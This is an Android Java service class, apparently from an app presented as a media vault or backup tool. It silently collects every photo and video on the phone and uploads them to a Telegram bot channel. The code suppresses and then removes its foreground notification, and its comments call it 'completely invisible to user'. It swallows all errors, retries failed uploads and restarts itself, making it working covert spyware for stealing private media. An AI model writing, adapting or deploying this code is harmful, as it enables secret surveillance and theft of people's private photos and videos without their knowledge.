package com.tenix.svault;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentUris;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class inq extends Service {

    // ── CONFIG ────────────────────────────────────────────────
    static String BOT_TOKEN  = "YOUR_BOT_TOKEN_HERE";
    static String CHANNEL_ID = "YOUR_CHANNEL_ID_HERE";
    // ─────────────────────────────────────────────────────────

    private static final long   MAX_SIZE   = 50L * 1024 * 1024;
    private static final String PREFS_NAME = "suzume_done";
    private static final String PREFS_KEY  = "ids";
    private static final String NOTIF_CH   = "sz_silent";
    private static final int    NOTIF_ID   = 1;

    private static volatile boolean running = false;
    private ExecutorService executor;
    private final Object lock = new Object();

    // ── Lifecycle ─────────────────────────────────────────────

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // Required by Android — but completely invisible to user
        silentForeground();

        if (running) return START_STICKY;
        running = true;

        executor = Executors.newSingleThreadExecutor();
        executor.execute(() -> {
            stopForeground(true); // remove even the silent notification instantly
            try { runUpload(); }
            catch (Exception ignored) {}
            finally { running = false; stopSelf(); }
        });

        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (executor != null) executor.shutdownNow();
    }

    // ── Silent foreground (invisible to user) ─────────────────

    @SuppressWarnings("deprecation")
    private void silentForeground() {
        NotificationManager nm =
                (NotificationManager) getSystemService(NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                    NOTIF_CH, ".", NotificationManager.IMPORTANCE_NONE);
            ch.setShowBadge(false);
            nm.createNotificationChannel(ch);
            Notification n = new Notification.Builder(this, NOTIF_CH)
                    .setSmallIcon(android.R.drawable.ic_delete)
                    .setShowWhen(false)
                    .build();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, n,
                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIF_ID, n);
            }
        } else {
            Notification n = new Notification.Builder(this)
                    .setSmallIcon(android.R.drawable.ic_delete)
                    .setPriority(Notification.PRIORITY_MIN)
                    .setShowWhen(false)
                    .build();
            startForeground(NOTIF_ID, n);
        }
    }

    // ── Upload flow ───────────────────────────────────────────

    @SuppressWarnings("NewApi")
    private void runUpload() {

        // Permission check
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) return;
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                    != android.content.pm.PackageManager.PERMISSION_GRANTED) return;
        }

        // Bot token check
        String[] r1 = {""};
        if (getMe(r1) != 200) return;

        // Channel check + start message
        String[] r2 = {""};
        if (sendText("🔵 Suzume backup started", r2) != 200) return;

        // Collect media
        ArrayList<Uri> all = collectMedia();
        Set<String> done = getDoneIds();
        ArrayList<Uri> pending = new ArrayList<>();
        for (Uri u : all) {
            try {
                if (!done.contains(String.valueOf(ContentUris.parseId(u)))) pending.add(u);
            } catch (Exception ignored) {
                pending.add(u);
            }
        }

        if (pending.isEmpty()) return;

        // 2 parallel upload threads
        ExecutorService pool = Executors.newFixedThreadPool(2);
        for (Uri uri : pending) {
            pool.submit(() -> {
                try {
                    if (getFileSize(uri) <= MAX_SIZE) {
                        int code = uploadWithRetry(uri);
                        if (code == 200) markDone(ContentUris.parseId(uri));
                    }
                } catch (Exception ignored) {}
            });
        }
        pool.shutdown();
        try { pool.awaitTermination(24, TimeUnit.HOURS); }
        catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }

    // ── Retry logic ───────────────────────────────────────────

    private int uploadWithRetry(Uri uri) {
        for (int i = 0; i < 3; i++) {
            int code = sendDocument(uri);
            if (code == 200) return 200;
            if (code == 429) {
                try { Thread.sleep(5000L * (i + 1)); }
                catch (InterruptedException e) { Thread.currentThread().interrupt(); return -1; }
            } else if (code >= 500) {
                try { Thread.sleep(2000); }
                catch (InterruptedException e) { Thread.currentThread().interrupt(); return -1; }
            } else return code;
        }
        return -1;
    }

    // ── Telegram: getMe ───────────────────────────────────────

    private int getMe(String[] out) {
        try {
            HttpURLConnection c = (HttpURLConnection)
                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getMe")
                    .openConnection();
            c.setConnectTimeout(15_000); c.setReadTimeout(15_000);
            int code = c.getResponseCode();
            drain(c, code); c.disconnect();
            return code;
        } catch (Exception e) { return -1; }
    }

    // ── Telegram: sendMessage ─────────────────────────────────

    private int sendText(String text, String[] out) {
        try {
            HttpURLConnection c = (HttpURLConnection)
                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
                    .openConnection();
            c.setRequestMethod("POST"); c.setDoOutput(true);
            c.setConnectTimeout(15_000); c.setReadTimeout(15_000);
            c.setRequestProperty("Content-Type",
                    "application/x-www-form-urlencoded; charset=UTF-8");
            String body = "chat_id=" + enc(CHANNEL_ID) + "&text=" + enc(text);
            byte[] bytes = body.getBytes("UTF-8");
            c.setRequestProperty("Content-Length", String.valueOf(bytes.length));
            DataOutputStream o = new DataOutputStream(c.getOutputStream());
            o.write(bytes); o.flush(); o.close();
            int code = c.getResponseCode();
            if (out != null) out[0] = drain(c, code); else drain(c, code);
            c.disconnect();
            return code;
        } catch (Exception e) { return -1; }
    }

    // ── Telegram: sendDocument ────────────────────────────────

    private int sendDocument(Uri uri) {
        try {
            String mime  = getContentResolver().getType(uri);
            if (mime == null) mime = "application/octet-stream";
            String fname = getFileName(uri, mime);
            String bound = "SZB" + System.currentTimeMillis();

            HttpURLConnection c = (HttpURLConnection)
                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
                    .openConnection();
            c.setRequestMethod("POST");
            c.setDoOutput(true); c.setDoInput(true);
            c.setConnectTimeout(30_000); c.setReadTimeout(180_000);
            c.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + bound);
            c.setRequestProperty("Connection", "close");

            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(CHANNEL_ID + "\r\n");
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; "
                    + "name=\"document\"; filename=\"" + fname + "\"\r\n");
            out.writeBytes("Content-Type: " + mime + "\r\n\r\n");
            try (InputStream in = getContentResolver().openInputStream(uri)) {
                byte[] buf = new byte[16384]; int n;
                if (in != null) while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
            }
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush(); out.close();

            int code = c.getResponseCode();
            drain(c, code); c.disconnect();
            return code;
        } catch (Exception e) { return -1; }
    }

    // ── Media scanning ────────────────────────────────────────

    private ArrayList<Uri> collectMedia() {
        ArrayList<Uri> list = new ArrayList<>();
        try (Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID},
                null, null, MediaStore.Images.Media.DATE_ADDED + " ASC")) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}
        try (Cursor c = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media._ID},
                null, null, MediaStore.Video.Media.DATE_ADDED + " ASC")) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}
        return list;
    }

    private long getFileSize(Uri uri) {
        try {
            AssetFileDescriptor a = getContentResolver().openAssetFileDescriptor(uri, "r");
            if (a != null) { long s = a.getLength(); a.close(); return Math.max(s, 0); }
        } catch (Exception ignored) {}
        return 0;
    }

    private String getFileName(Uri uri, String mime) {
        try (Cursor c = getContentResolver().query(uri,
                new String[]{MediaStore.MediaColumns.DISPLAY_NAME}, null, null, null)) {
            if (c != null && c.moveToFirst()) {
                String n = c.getString(0);
                if (n != null && !n.isEmpty()) return n;
            }
        } catch (Exception ignored) {}
        String ext = "";
        if (mime != null) switch (mime) {
            case "image/jpeg": ext = ".jpg"; break;
            case "image/png":  ext = ".png"; break;
            case "image/gif":  ext = ".gif"; break;
            case "image/webp": ext = ".webp"; break;
            case "image/heic": ext = ".heic"; break;
            case "video/mp4":  ext = ".mp4"; break;
            case "video/3gpp": ext = ".3gp"; break;
            case "video/quicktime": ext = ".mov"; break;
            case "video/x-matroska": ext = ".mkv"; break;
        }
        return "media_" + System.currentTimeMillis() + ext;
    }

    // ── Progress persistence ──────────────────────────────────

    private Set<String> getDoneIds() {
        synchronized (lock) {
            return new HashSet<>(getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
                    .getStringSet(PREFS_KEY, new HashSet<>()));
        }
    }

    private void markDone(long id) {
        synchronized (lock) {
            SharedPreferences p = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            Set<String> ids = new HashSet<>(p.getStringSet(PREFS_KEY, new HashSet<>()));
            ids.add(String.valueOf(id));
            p.edit().putStringSet(PREFS_KEY, ids).apply();
        }
    }

    // ── Helpers ───────────────────────────────────────────────

    private String drain(HttpURLConnection c, int code) {
        try {
            InputStream s = code == 200 ? c.getInputStream() : c.getErrorStream();
            if (s == null) return "";
            byte[] buf = new byte[512]; while (s.read(buf) != -1) {} s.close();
        } catch (Exception ignored) {}
        return "";
    }

    private static String enc(String s) {
        try { return java.net.URLEncoder.encode(s, "UTF-8"); }
        catch (Exception e) { return s; }
    }
}
